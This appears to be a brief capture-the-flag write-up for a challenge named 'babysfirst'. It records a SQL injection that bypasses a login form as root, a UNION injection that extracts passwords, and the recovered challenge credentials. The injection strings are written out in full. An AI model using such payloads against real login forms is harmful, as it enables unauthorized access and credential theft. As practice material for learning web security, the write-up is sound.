# Initial screen  
	babysfirst  
	login  

	Username:  

	Password:  

# Progress  
## Injection 
There is an injection vulnerability in the login form.  
If you put ' or 1=1 -- in as your username and anything as the password it gives you the following screen.  

	babysfirst  
	success!  

	logged in as root  

The query that was executed is returned in the HTTP response headers  

	X-Sql=select name from users where name = '' or 1=1 -- ' and password = '' limit 1;  

Getting a bit further.  You can UNION the query and pull more details.  I think this may take digging into the schemas table and finding all the column names in the users table.  

	root' UNION select password as name from users where name='root' order by name asc --  	
	X-Sql=select name from users where name = 'root' UNION select password as name from users where name='root' order by name asc --' and password = '' limit 1;  

## Users/Passwords  
Using the UNION query the following users/passwords were pulled.  

	root/barking up the wrong tree  
	user/password  

